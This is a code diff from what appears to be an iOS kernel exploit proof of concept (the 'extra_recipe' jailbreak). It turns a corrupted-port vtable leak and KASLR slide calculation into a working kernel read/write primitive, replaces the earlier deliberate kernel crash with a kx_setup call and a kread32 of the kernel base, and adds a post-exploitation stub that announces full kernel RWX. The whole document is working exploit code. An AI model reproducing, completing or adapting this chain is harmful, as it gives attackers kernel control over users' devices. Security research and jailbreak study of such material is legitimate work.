@@ -60,6 +60,15 @@ static int _is_port_corrupt(mach_port_t port)
     return 0;
 }
 
+void post_exploitation(uint64_t kaslr_shift)
+{
+    // Do Electra/QiLin/Saurik/etc stuff here
+    
+    printf("Post-exploitation stage, you have kernel RWX with a clear API now (extra_recipe_utils.h) so put whatever you want here (let me spell it out for you Reddit: this === tfp0). There is no more exploitation of any vulnerabilities to be done, only mitigation bypasses of which all are public. I called this a PoC because of lack of offsets, elegant techniques, testing, reliability, documentation and so on, not because it does nothing\n");
+    
+    // kx3(0xffffffff41414141, 0x1111, 0x2222, 0x3333);
+}
+
 void jb_go(void)
 {
     io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
@@ -154,9 +163,9 @@ void jb_go(void)
     recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
     
     uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
-    uint64_t kaslr_slide = vtable - 0xfffffff006fdd978;
+    uint64_t kaslr_shift = vtable - 0xfffffff006fdd978;
     printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
-    printf("kaslr slide: %p\n", (void *)kaslr_slide);
+    printf("kaslr shift: %p\n", (void *)kaslr_shift);
     
     // Out of everything not done properly in this POC, this is
     // not done properly the most
@@ -164,28 +173,17 @@ void jb_go(void)
     for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
         toolazy_ports[i] = prealloc_port(prealloc_size-0x28); // Not even really aligned because lazy
     }
+
+    kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
     
-    uint64_t new_vtable = contained_port_addr - 0x30;
-    uint64_t PC = 0xffffffff41414141;
-    *(uint64_t *)(send_buf + 0x10) = new_vtable;
-    *(uint64_t *)(send_buf + 0x10 + 8) = PC;
+    uint64_t kernel_base = 0xfffffff007004000 + kaslr_shift;
+    uint32_t val = kread32(kernel_base);
     
-    for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
-        prepare_prealloc_port(toolazy_ports[i]);
-        send_prealloc_msg(toolazy_ports[i], (uint64_t *)send_buf, 30);
-    }
-   
-    // Set PC, X0 points to our buffer
-    // To control arguments, use OSSerializer::serialize or whatever you like
-    printf("Crashing kernel at/calling %p now\n", (void *)PC);
-    fflush(stdout);
-    sleep(1);
+    printf("kernelbase DWORD: %08X\n", val);
     
-    for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
-        io_service_t service;
-        kern_return_t IOConnectGetService(io_connect_t connect, io_service_t  *service);
-        IOConnectGetService(refill_userclients[i], &service);
-    }
+    post_exploitation(kaslr_shift);
     
-    // Never reached.
+    printf("Done\n");
+    for (;;)
+        sleep(1);
 }
